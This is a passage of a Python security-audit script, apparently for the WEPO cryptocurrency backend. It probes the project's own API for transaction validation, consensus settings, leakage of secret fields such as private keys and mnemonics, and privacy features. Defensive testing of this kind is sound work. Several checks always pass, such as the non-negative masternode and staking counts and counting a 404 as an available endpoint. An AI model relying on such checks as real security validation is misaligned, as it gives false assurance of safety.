            print(f"  🚨 Zero amount: Transaction with zero amount accepted")
        
        # Test 4: Self-transaction (same from and to address)
        total_verification_tests += 1
        self_transaction = {
            "from_address": address1,
            "to_address": address1,
            "amount": 1.0,
            "password_hash": "fake_hash"
        }
        
        response = requests.post(f"{API_URL}/transaction/send", json=self_transaction)
        if response.status_code in [400, 422]:
            verification_tests_passed += 1
            print(f"  ✅ Self-transaction: Self-transaction properly rejected")
        elif response.status_code == 200:
            print(f"  ⚠️ Self-transaction: Self-transaction allowed (may be by design)")
            verification_tests_passed += 0.5  # Partial credit
        else:
            print(f"  🚨 Self-transaction: Unexpected response {response.status_code}")
        
        success_rate = verification_tests_passed / total_verification_tests
        if success_rate >= 0.75:
            log_security_test("Transaction Verification", True, "low",
                            details=f"Transaction verification working: {verification_tests_passed}/{total_verification_tests} tests passed")
            return True
        else:
            log_security_test("Transaction Verification", False, "high",
                            f"Transaction verification vulnerabilities: {verification_tests_passed}/{total_verification_tests} tests passed")
            return False
            
    except Exception as e:
        log_security_test("Transaction Verification", False, "medium",
                        "Error during transaction verification testing", error=str(e))
        return False

def test_consensus_mechanism():
    """Test consensus mechanism vulnerabilities"""
    print("\n🔐 PHASE 4.2: CONSENSUS MECHANISM TESTING")
    print("Testing consensus mechanism vulnerabilities...")
    
    try:
        # Test mining information and consensus data
        mining_response = requests.get(f"{API_URL}/mining/info")
        network_response = requests.get(f"{API_URL}/network/status")
        
        if mining_response.status_code != 200 or network_response.status_code != 200:
            log_security_test("Consensus Mechanism", False, "medium",
                            "Cannot access mining/network information for consensus testing")
            return False
        
        mining_data = mining_response.json()
        network_data = network_response.json()
        
        consensus_security_score = 0
        
        # Test 1: Check for reasonable difficulty adjustment
        difficulty = mining_data.get('difficulty', 0)
        if difficulty > 0:
            consensus_security_score += 1
            print(f"  ✅ Difficulty: Mining difficulty properly set: {difficulty}")
        else:
            print(f"  🚨 Difficulty: Mining difficulty not set or zero")
        
        # Test 2: Check for proper block time
        block_time = mining_data.get('block_time', '')
        if block_time and ('minute' in block_time.lower() or 'second' in block_time.lower()):
            consensus_security_score += 1
            print(f"  ✅ Block time: Reasonable block time: {block_time}")
        else:
            print(f"  🚨 Block time: Block time not properly configured")
        
        # Test 3: Check for active masternodes (decentralization)
        active_masternodes = network_data.get('active_masternodes', 0)
        if active_masternodes >= 0:  # Even 0 is acceptable for testing
            consensus_security_score += 1
            print(f"  ✅ Masternodes: Masternode system configured: {active_masternodes} active")
        else:
            print(f"  🚨 Masternodes: Masternode system not properly configured")
        
        # Test 4: Check for staking mechanism (PoS security)
        total_staked = network_data.get('total_staked', 0)
        if total_staked >= 0:  # Even 0 is acceptable for testing
            consensus_security_score += 1
            print(f"  ✅ Staking: Staking mechanism configured: {total_staked} WEPO staked")
        else:
            print(f"  🚨 Staking: Staking mechanism not properly configured")
        
        # Test 5: Check for reasonable total supply (economic security)
        total_supply = network_data.get('total_supply', 0)
        if total_supply > 1000000:  # Reasonable total supply
            consensus_security_score += 1
            print(f"  ✅ Economic model: Reasonable total supply: {total_supply:,} WEPO")
        else:
            print(f"  🚨 Economic model: Total supply seems too low: {total_supply}")
        
        if consensus_security_score >= 4:
            log_security_test("Consensus Mechanism", True, "low",
                            details=f"Consensus mechanism security: {consensus_security_score}/5 checks passed")
            return True
        else:
            log_security_test("Consensus Mechanism", False, "medium",
                            f"Consensus mechanism vulnerabilities: {consensus_security_score}/5 checks passed")
            return False
            
    except Exception as e:
        log_security_test("Consensus Mechanism", False, "medium",
                        "Error during consensus mechanism testing", error=str(e))
        return False

# ===== PHASE 5: DATA STORAGE & PRIVACY =====

def test_data_exposure():
    """Test for sensitive data exposure in logs/responses"""
    print("\n🔐 PHASE 5.1: SENSITIVE DATA EXPOSURE TESTING")
    print("Testing for sensitive data exposure in logs/responses...")
    
    try:
        # Create test wallet with known sensitive data
        test_wallet = generate_realistic_test_data()
        sensitive_password = test_wallet["password"]
        sensitive_key = test_wallet["encrypted_private_key"]
        
        create_response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
        
        if create_response.status_code != 200:
            log_security_test("Data Exposure", False, "medium",
                            "Cannot create test wallet for data exposure testing")
            return False
        
        data_protection_score = 0
        total_protection_tests = 0
        
        # Test 1: Check wallet creation response for sensitive data
        total_protection_tests += 1
        create_response_text = create_response.text.lower()
        
        if (sensitive_password.lower() not in create_response_text and 
            sensitive_key.lower() not in create_response_text):
            data_protection_score += 1
            print(f"  ✅ Wallet creation: Sensitive data not exposed in creation response")
        else:
            print(f"  🚨 Wallet creation: Sensitive data exposed in creation response")
        
        # Test 2: Check wallet retrieval for sensitive data exposure
        total_protection_tests += 1
        wallet_address = create_response.json().get('address')
        
        if wallet_address:
            get_response = requests.get(f"{API_URL}/wallet/{wallet_address}")
            if get_response.status_code == 200:
                get_response_text = get_response.text.lower()
                
                sensitive_fields = ['password', 'private_key', 'mnemonic', 'seed']
                exposed_fields = [field for field in sensitive_fields if field in get_response_text]
                
                if len(exposed_fields) == 0:
                    data_protection_score += 1
                    print(f"  ✅ Wallet retrieval: No sensitive field names exposed")
                else:
                    print(f"  🚨 Wallet retrieval: Sensitive field names exposed: {exposed_fields}")
            else:
                print(f"  ⚠️ Wallet retrieval: Cannot test - retrieval failed")
        
        # Test 3: Check transaction endpoints for data exposure
        total_protection_tests += 1
        fake_transaction = {
            "from_address": wallet_address,
            "to_address": f"wepo1{secrets.token_hex(16)}",
            "amount": 1.0,
            "password_hash": hashlib.sha256(sensitive_password.encode()).hexdigest()
        }
        
        tx_response = requests.post(f"{API_URL}/transaction/send", json=fake_transaction)
        if tx_response.status_code in [200, 400, 404]:  # Any response is fine for this test
            tx_response_text = tx_response.text.lower()
            
            if (sensitive_password.lower() not in tx_response_text and
                fake_transaction["password_hash"] not in tx_response_text):
                data_protection_score += 1
                print(f"  ✅ Transaction: Sensitive data not exposed in transaction response")
            else:
                print(f"  🚨 Transaction: Sensitive data exposed in transaction response")
        else:
            print(f"  ⚠️ Transaction: Cannot test - transaction endpoint unavailable")
        
        # Test 4: Check error responses for information disclosure
        total_protection_tests += 1
        # Try to trigger an error with invalid data
        invalid_data = {"invalid": "data"}
        error_response = requests.post(f"{API_URL}/wallet/create", json=invalid_data)
        
        if error_response.status_code in [400, 422, 500]:
            error_text = error_response.text.lower()
            
            # Check for information disclosure in error messages
            disclosure_indicators = [
                'traceback', 'stack trace', 'file path', 'line number',
                'database', 'sql', 'mongodb', 'connection string',
                'internal server', 'debug', 'exception'
            ]
            
            disclosed_info = [indicator for indicator in disclosure_indicators if indicator in error_text]
            
            if len(disclosed_info) == 0:
                data_protection_score += 1
                print(f"  ✅ Error handling: No sensitive information disclosed in errors")
            else:
                print(f"  🚨 Error handling: Information disclosed in errors: {disclosed_info}")
        else:
            print(f"  ⚠️ Error handling: Cannot test - no error response generated")
        
        success_rate = data_protection_score / total_protection_tests
        if success_rate >= 0.75:
            log_security_test("Data Exposure", True, "low",
                            details=f"Data protection working: {data_protection_score}/{total_protection_tests} tests passed")
            return True
        else:
            log_security_test("Data Exposure", False, "high",
                            f"Sensitive data exposure vulnerabilities: {data_protection_score}/{total_protection_tests} tests passed")
            return False
            
    except Exception as e:
        log_security_test("Data Exposure", False, "medium",
                        "Error during data exposure testing", error=str(e))
        return False

def test_privacy_mechanisms():
    """Test privacy mechanisms (Quantum Vault, Ghost Transfers, etc.)"""
    print("\n🔐 PHASE 5.2: PRIVACY MECHANISMS TESTING")
    print("Testing privacy mechanisms (Quantum Vault, Ghost Transfers, etc.)...")
    
    try:
        privacy_score = 0
        total_privacy_tests = 0
        
        # Test 1: Quantum Vault creation
        total_privacy_tests += 1
        vault_data = {
            "user_address": f"wepo1{secrets.token_hex(16)}",
            "privacy_level": 4,
            "multi_asset_support": True
        }
        
        vault_response = requests.post(f"{API_URL}/vault/create", json=vault_data)
        if vault_response.status_code == 200:
            vault_result = vault_response.json()
            if vault_result.get('success') and vault_result.get('vault_id'):
                privacy_score += 1
                print(f"  ✅ Quantum Vault: Vault creation successful")
                
                # Test vault status retrieval
                vault_id = vault_result['vault_id']
                status_response = requests.get(f"{API_URL}/vault/status/{vault_id}")
                if status_response.status_code == 200:
                    print(f"  ✅ Quantum Vault: Vault status retrieval working")
                else:
                    print(f"  ⚠️ Quantum Vault: Vault status retrieval failed")
            else:
                print(f"  🚨 Quantum Vault: Vault creation failed - invalid response")
        else:
            print(f"  🚨 Quantum Vault: Vault creation failed - HTTP {vault_response.status_code}")
        
        # Test 2: RWA Quantum Vault creation
        total_privacy_tests += 1
        rwa_vault_data = {
            "wallet_address": f"wepo1{secrets.token_hex(16)}",
            "asset_type": "real_estate",
            "privacy_level": "maximum"
        }
        
        rwa_vault_response = requests.post(f"{API_URL}/vault/rwa/create", json=rwa_vault_data)
        if rwa_vault_response.status_code == 200:
            rwa_result = rwa_vault_response.json()
            if rwa_result.get('success') and rwa_result.get('vault_id'):
                privacy_score += 1
                print(f"  ✅ RWA Quantum Vault: RWA vault creation successful")
            else:
                print(f"  🚨 RWA Quantum Vault: RWA vault creation failed - invalid response")
        else:
            print(f"  🚨 RWA Quantum Vault: RWA vault creation failed - HTTP {rwa_vault_response.status_code}")
        
        # Test 3: Privacy mixing service availability
        total_privacy_tests += 1
        # Check if privacy mixing endpoints are available
        mixing_endpoints = [
            "/btc-mixing/mixers",
            "/btc-mixing/statistics",
            "/masternode/btc-mixing/register"
        ]
        
        mixing_available = 0
        for endpoint in mixing_endpoints:
            try:
                response = requests.get(f"{API_URL}{endpoint}")
                if response.status_code in [200, 400, 404]:  # Any response indicates endpoint exists
                    mixing_available += 1
            except:
                pass
        
        if mixing_available >= 2:
            privacy_score += 1
            print(f"  ✅ Privacy mixing: {mixing_available}/3 mixing endpoints available")
        else:
            print(f"  🚨 Privacy mixing: Only {mixing_available}/3 mixing endpoints available")
        
        # Test 4: Transaction privacy features
        total_privacy_tests += 1
        # Create a test transaction and check for privacy features
        test_wallet = generate_realistic_test_data()
        create_response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
        
        if create_response.status_code == 200:
            wallet_address = create_response.json().get('address')
            
            privacy_transaction = {
                "from_address": wallet_address,
                "to_address": f"wepo1{secrets.token_hex(16)}",
                "amount": 1.0,
                "password_hash": "test_hash"
            }
            
            tx_response = requests.post(f"{API_URL}/transaction/send", json=privacy_transaction)
            if tx_response.status_code in [200, 400, 404]:
                tx_result = tx_response.json() if tx_response.status_code == 200 else {}
                
                # Check for privacy features in transaction response
                privacy_features = ['privacy_proof', 'ring_signature', 'privacy_protected']
                found_features = [feature for feature in privacy_features if feature in str(tx_result)]
                
                if found_features:
                    privacy_score += 1
                    print(f"  ✅ Transaction privacy: Privacy features detected: {found_features}")
                else:
                    print(f"  🚨 Transaction privacy: No privacy features detected in transactions")
            else:
                print(f"  ⚠️ Transaction privacy: Cannot test - transaction endpoint unavailable")
        else:
            print(f"  ⚠️ Transaction privacy: Cannot test - wallet creation failed")
        
        success_rate = privacy_score / total_privacy_tests
        if success_rate >= 0.5:  # At least 50% of privacy features should work
            log_security_test("Privacy Mechanisms", True, "low",
                            details=f"Privacy mechanisms working: {privacy_score}/{total_privacy_tests} tests passed")
            return True
        else:
            log_security_test("Privacy Mechanisms", False, "medium",
                            f"Privacy mechanism vulnerabilities: {privacy_score}/{total_privacy_tests} tests passed")
            return False
            
    except Exception as e:
        log_security_test("Privacy Mechanisms", False, "medium",
                        "Error during privacy mechanisms testing", error=str(e))
        return False

# ===== MAIN SECURITY AUDIT EXECUTION =====

def run_comprehensive_security_audit():
    """Run comprehensive security audit and penetration testing"""
    print("🔒 STARTING WEPO CRYPTOCURRENCY BACKEND COMPREHENSIVE SECURITY AUDIT")
    print("Conducting penetration testing across all security domains...")
    print("=" * 100)
    
    # Phase 1: Authentication & Session Security
    print("\n" + "="*50)
    print("🔐 PHASE 1: AUTHENTICATION & SESSION SECURITY")
    print("="*50)
    
    auth_brute_force = test_authentication_brute_force_protection()
    session_mgmt = test_session_management_security()
    password_security = test_password_security()
    
    # Phase 2: API Security Testing
    print("\n" + "="*50)
    print("🔐 PHASE 2: API SECURITY TESTING")
    print("="*50)
    
    sql_injection = test_sql_injection_vulnerabilities()
    authorization = test_authorization_bypass()
    rate_limiting = test_rate_limiting()
    input_validation = test_input_validation()
    http_headers = test_http_security_headers()
    
    # Phase 3: Cryptographic Security
    print("\n" + "="*50)
    print("🔐 PHASE 3: CRYPTOGRAPHIC SECURITY")
    print("="*50)
    
    dilithium2 = test_dilithium2_implementation()
    random_gen = test_random_number_generation()
    
    # Phase 4: Blockchain & Consensus Security
    print("\n" + "="*50)
    print("🔐 PHASE 4: BLOCKCHAIN & CONSENSUS SECURITY")
    print("="*50)
    
    transaction_verification = test_transaction_verification()
    consensus_mechanism = test_consensus_mechanism()
    
    # Phase 5: Data Storage & Privacy
    print("\n" + "="*50)
    print("🔐 PHASE 5: DATA STORAGE & PRIVACY")
    print("="*50)
    
    data_exposure = test_data_exposure()
    privacy_mechanisms = test_privacy_mechanisms()
    
    # Generate comprehensive security report
    print("\n" + "="*100)
    print("🔒 WEPO CRYPTOCURRENCY BACKEND COMPREHENSIVE SECURITY AUDIT RESULTS")
    print("="*100)
    
    total_tests = security_audit_results["total_tests"]
    passed_tests = security_audit_results["passed_tests"]
    failed_tests = security_audit_results["failed_tests"]
    
    success_rate = (passed_tests / total_tests) * 100 if total_tests > 0 else 0
    
    print(f"Total Security Tests: {total_tests}")
    print(f"Passed: {passed_tests} ✅")
    print(f"Failed: {failed_tests} 🚨")
    print(f"Success Rate: {success_rate:.1f}%")
    
    # Vulnerability Summary
    print(f"\n🚨 VULNERABILITY SUMMARY:")
    for severity in ['critical', 'high', 'medium', 'low']:
        vuln_count = len(security_audit_results["vulnerabilities"][severity])
        if vuln_count > 0:
            print(f"  {severity.upper()}: {vuln_count} vulnerabilities")
            for vuln in security_audit_results["vulnerabilities"][severity]:
                print(f"    - {vuln['test']}: {vuln['details']}")
    
    # Security Recommendations
    print(f"\n📋 SECURITY RECOMMENDATIONS:")
    
    critical_vulns = len(security_audit_results["vulnerabilities"]["critical"])
    high_vulns = len(security_audit_results["vulnerabilities"]["high"])
    
    if critical_vulns > 0:
        print("🚨 CRITICAL PRIORITY:")
        print("  - Address all critical vulnerabilities immediately")
        print("  - Conduct additional security review before public launch")
    
    if high_vulns > 0:
        print("⚠️ HIGH PRIORITY:")
        print("  - Address high-severity vulnerabilities before launch")
        print("  - Implement additional security controls")
    
    print("🔒 GENERAL RECOMMENDATIONS:")
    print("  - Implement comprehensive rate limiting on all endpoints")
    print("  - Add security headers to all HTTP responses")
    print("  - Enhance input validation and sanitization")
    print("  - Implement proper session management with secure tokens")
    print("  - Add comprehensive logging and monitoring")
    print("  - Conduct regular security audits and penetration testing")
    
    # Overall Security Assessment
    if success_rate >= 80:
        print(f"\n🎉 OVERALL SECURITY ASSESSMENT: GOOD")
        print("✅ WEPO backend systems show good security posture")
        print("✅ Most security controls are properly implemented")
        print("✅ Under launch review with minor improvements")
        return True
    elif success_rate >= 60:
        print(f"\n⚠️ OVERALL SECURITY ASSESSMENT: MODERATE")
        print("⚠️ WEPO backend systems have moderate security posture")
        print("⚠️ Several security improvements needed before launch")
        print("⚠️ Address high-priority vulnerabilities before genesis date")
        return False
    else:
        print(f"\n🚨 OVERALL SECURITY ASSESSMENT: POOR")
        print("🚨 WEPO backend systems have significant security vulnerabilities")
        print("🚨 Major security improvements required before launch")
        print("🚨 NOT READY for launch - security review required")
        return False

if __name__ == "__main__":
    success = run_comprehensive_security_audit()
    if not success:
        sys.exit(1)